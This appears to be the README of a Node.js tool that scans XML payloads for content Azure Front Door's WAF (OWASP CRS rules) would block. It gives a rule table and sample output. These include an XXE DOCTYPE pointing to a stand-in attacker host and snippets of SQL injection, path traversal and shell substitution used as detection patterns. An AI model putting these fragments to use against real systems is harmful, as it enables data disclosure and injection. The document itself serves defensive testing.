# WAF-XML-VULN-Scanner

A self-contained, zero-dependency Node.js CLI tool that scans an XML file for
vulnerabilities that would be blocked by **Azure Front Door's WAF** (OWASP CRS
rules). Each finding reports the **exact line number**, the matching text
excerpt, a **WAF rule ID**, severity, and a human-readable explanation so you
can understand why the request was blocked and how to fix it (or write a
targeted WAF exclusion/custom rule).

---

## Requirements

- **Node.js ≥ 18** (no `npm install` needed — zero external dependencies)

---

## Quick Start

```bash
# Scan an XML file
node scanner.js your-payload.xml

# Machine-readable JSON output
node scanner.js your-payload.xml --json

# Show help
node scanner.js --help
```

---

## Example Output

Running against the included `examples/malicious.xml`:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 WAF XML Vulnerability Scanner
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 File    : examples/malicious.xml
 Lines   : 89
 Findings: 32
 Summary : 4 CRITICAL  18 HIGH  3 MEDIUM
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[1/32] [CRITICAL] Rule 921160 – XXE – DOCTYPE with SYSTEM identifier
  Line 9: <!DOCTYPE order SYSTEM "http://evil.example.com/evil.dtd" [
  ┌─ Context ──────────────────────────────────────────
  │   7  │ -->
  │   8  │
  │▶  9  │ <!DOCTYPE order SYSTEM "http://evil.example.com/evil.dtd" [
  │  10  │   <!ELEMENT order ANY>
  │  11  │   <!-- ② External entity declaration – SYSTEM URI (Rule 921162) -->
  └───────────────────────────────────────────────────
  Why: DOCTYPE declaration containing a SYSTEM identifier. This allows the
       XML parser to fetch an external resource …
  Fix: Remove the DOCTYPE declaration or replace SYSTEM with a static …
```

Running against the included `examples/clean.xml`:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 WAF XML Vulnerability Scanner
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 File    : examples/clean.xml
 Lines   : 40
 Findings: 0 (clean)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

 ✔  No WAF rule violations detected.
```

---

## WAF Rules Implemented

The scanner implements patterns modelled after the **OWASP Core Rule Set
(CRS)** which is used by Azure Front Door's Managed Rule Set.

| Rule ID | Category | Severity | What it catches |
|---------|----------|----------|-----------------|
| 921160 | XXE | CRITICAL | `DOCTYPE` with `SYSTEM` identifier |
| 921161 | XXE | CRITICAL | `DOCTYPE` with `PUBLIC` identifier |
| 921162 | XXE | CRITICAL | External entity declaration (`ENTITY … SYSTEM`) |
| 921163 | XXE | CRITICAL | External entity declaration (`ENTITY … PUBLIC`) |
| 921164 | XXE | CRITICAL | `file://`, `expect://`, `php://` and other dangerous URI schemes |
| 921170 | XML Bomb | HIGH | Four or more consecutive entity references on one line |
| 921171 | XML Bomb | HIGH | More than 10 entity declarations in the document |
| 921172 | XML Bomb | MEDIUM | Element nesting depth exceeding 20 levels |
| 921180 | Code Injection | HIGH | Non-standard processing instructions (`<?php`, `<?asp`, …) |
| 921190 | XSS/XXE Bypass | MEDIUM | CDATA section containing script or entity markers |
| 941100 | XSS | HIGH | `<script>` tag |
| 941110 | XSS | HIGH | Inline event handler attributes (`onclick=`, `onload=`, …) |
| 941120 | XSS | HIGH | `javascript:` URI scheme |
| 941130 | XSS | HIGH | `<iframe>`, `<object>`, `<embed>` and similar elements |
| 941150 | XSS | MEDIUM | HTML elements with URL-loading attributes (`src=`, `href=`) |
| 942100 | SQLi | HIGH | `UNION SELECT` |
| 942200 | SQLi | HIGH | SQL comment operators combined with SQL keywords |
| 942260 | SQLi | HIGH | Authentication bypass tautologies (`' OR '1'='1`) |
| 942340 | SQLi | HIGH | Stacked/batched queries (`; DROP TABLE …`) |
| 942410 | SQLi | MEDIUM | Dangerous SQL functions (`SLEEP`, `BENCHMARK`, `LOAD_FILE`, …) |
| 930100 | Path Traversal | MEDIUM | `../../` sequences |
| 930110 | Path Traversal | MEDIUM | URL-encoded path traversal (`%2e%2e%2f`) |
| 934100 | SSRF | HIGH | URLs targeting private/internal IP ranges |
| 932100 | RCE | HIGH | Shell command injection (`$(…)`, backtick substitution) |
| 932110 | RCE | HIGH | Server-side template injection markers (`{{…}}`, `${…}`, `<%…%>`) |

---

## Exit Codes

| Code | Meaning |
|------|---------|
| `0`  | No violations found (file is clean) |
| `1`  | One or more violations found (or file not found / error) |

---

## JSON Output

Use `--json` for machine-readable output suitable for CI pipelines or
further processing:

```json
{
  "file": "/absolute/path/to/file.xml",
  "lines": 89,
  "total": 32,
  "findings": [
    {
      "ruleId": "921160",
      "ruleName": "XXE – DOCTYPE with SYSTEM identifier",
      "severity": "CRITICAL",
      "line": 9,
      "match": "<!DOCTYPE order SYSTEM \"http://evil.example.com/evil.dtd\" [",
      "description": "...",
      "remediation": "..."
    }
  ]
}
```

---

## Running Tests

```bash
node test/scanner.test.js
```

---

## Example Files

| File | Description |
|------|-------------|
| `examples/clean.xml` | Well-formed XML with no violations — should produce 0 findings |
| `examples/malicious.xml` | XML triggering every implemented WAF rule — annotated with which rule each section triggers |
